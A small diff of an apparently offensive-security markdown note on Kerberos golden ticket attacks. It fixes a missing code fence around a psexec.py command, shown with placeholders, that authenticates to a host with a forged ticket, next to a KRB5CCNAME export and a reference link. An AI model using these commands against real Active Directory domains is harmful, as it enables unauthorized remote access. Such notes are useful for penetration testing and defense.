@@ -23,7 +23,7 @@ Export the ticket: \
 ```export KRB5CCNAME=[USER.CCACHE]```
 
 Authenticate with the created ticket to the domain controller: \
-```psexec.py [DOMAIN]/[USER]@[HOST] -k -no-pass -dc-ip [DOMAINCONTROLLER]
+```psexec.py [DOMAIN]/[USER]@[HOST] -k -no-pass -dc-ip [DOMAINCONTROLLER]```
 
 ## References
 * [Microsoft Active Directory Golden Ticket Attacks Explained](https://www.qomplx.com/qomplx-knowledge-golden-ticket-attacks-explained/)
